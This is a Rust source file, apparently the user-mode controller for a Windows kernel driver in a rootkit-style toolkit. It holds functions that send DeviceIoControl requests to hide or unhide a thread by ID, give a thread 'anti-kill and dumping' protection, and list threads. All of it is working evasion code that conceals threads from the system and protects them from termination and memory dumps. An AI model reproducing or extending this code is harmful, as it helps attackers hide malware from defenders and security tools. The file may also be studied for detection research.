use {
    log::*,
    crate::{cli::Options, utils::open_driver},
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    shared::{
        structs::{EnumerateInfoInput, TargetThread, ThreadListInfo},
        vars::MAX_TIDS,
    },
    windows_sys::Win32::{
        Foundation::CloseHandle,
        System::IO::DeviceIoControl,
    },
};

pub fn hide_unhide_thread(tid: Option<&u32>, ioctl_code: u32, enable: bool) {
    debug!("Attempting to open the driver for hide/unhide operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(tid_value) = tid {
        debug!("Preparing structure for TID: {}", tid_value);
        let mut return_buffer = 0;
        let tid = *tid_value as usize;
        let mut target_thread = TargetThread { tid, enable };

        debug!("Sending DeviceIoControl command to {} thread", if enable { "hide" } else { "unhide" });
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_thread as *mut _ as *mut c_void,
                size_of::<TargetThread>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            info!("Thread with TID {} successfully {}hidden", tid, if enable { "" } else { "un" });
        }
    } else {
        error!("TID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    };
}

#[cfg(not(feature = "mapper"))]
pub fn protection_thread(tid: Option<&u32>, ioctl_code: u32, enable: bool) {
    debug!("Attempting to open the driver for thread protection operation");
    let h_file = open_driver().expect("Failed to open driver");

    if let Some(tid_value) = tid {
        debug!("Preparing structure for TID: {}", tid_value);
        let mut return_buffer = 0;
        let tid = *tid_value as usize;
        let mut target_thread = shared::structs::ThreadProtection { tid, enable };

        debug!("Sending DeviceIoControl command to {} thread protection", if enable { "enable" } else { "disable" });
        let status = unsafe {
            DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_thread as *mut _ as *mut c_void,
                size_of::<shared::structs::ThreadProtection>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            info!("Thread TID {} with anti-kill and dumping functions {}", tid, if enable { "enabled" } else { "disabled" });
        }
    } else {
        error!("TID not supplied");
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    };
}

pub fn enumerate_thread(ioctl_code: u32, option: &Options) {
    debug!("Attempting to open the driver for thread enumeration");
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_thread: [ThreadListInfo; MAX_TIDS] = unsafe { std::mem::zeroed() };
    let mut enumeration_input = EnumerateInfoInput {
        options: option.to_shared(),
    };
    let mut return_buffer = 0;

    debug!("Sending DeviceIoControl command to enumerate threads");
    let status = unsafe {
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut enumeration_input as *mut _ as *mut c_void,
            size_of::<EnumerateInfoInput>() as u32,
            info_thread.as_mut_ptr() as *mut _,
            (info_thread.len() * size_of::<ThreadListInfo>()) as u32,
            &mut return_buffer,
            null_mut(),
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        let total_threads = return_buffer as usize / size_of::<ThreadListInfo>();
        info!("Total Threads: {}", total_threads);
        for i in 0..total_threads {
            if info_thread[i].tids > 0 {
                info!("[{}] {}", i, info_thread[i].tids);
            }
        }
    }

    debug!("Closing the driver handle");
    unsafe {
        CloseHandle(h_file);
    };
}
